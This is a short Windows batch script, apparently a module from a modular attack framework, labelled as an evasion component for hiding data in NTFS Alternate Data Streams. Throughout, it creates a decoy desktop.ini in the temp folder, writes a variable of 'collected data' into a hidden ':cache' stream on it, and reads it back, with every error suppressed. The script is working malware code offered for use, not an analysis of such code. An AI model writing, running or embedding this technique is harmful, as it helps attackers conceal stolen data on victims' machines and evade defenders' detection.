REM provides: evasion_ads_hide
REM depends: (none)
REM description: Hide data in NTFS Alternate Data Streams for covert storage

REM Create a legitimate-looking host file for the ADS
if not exist "%TEMP%\desktop.ini" echo [.ShellClassInfo] > "%TEMP%\desktop.ini" 2>nul

REM Store collected data in an ADS attached to the host file
if defined COLLECTED_DATA (
    echo %COLLECTED_DATA% > "%TEMP%\desktop.ini:cache" 2>nul
)

REM Read back from ADS when needed
if exist "%TEMP%\desktop.ini" (
    more < "%TEMP%\desktop.ini:cache" >nul 2>nul
)
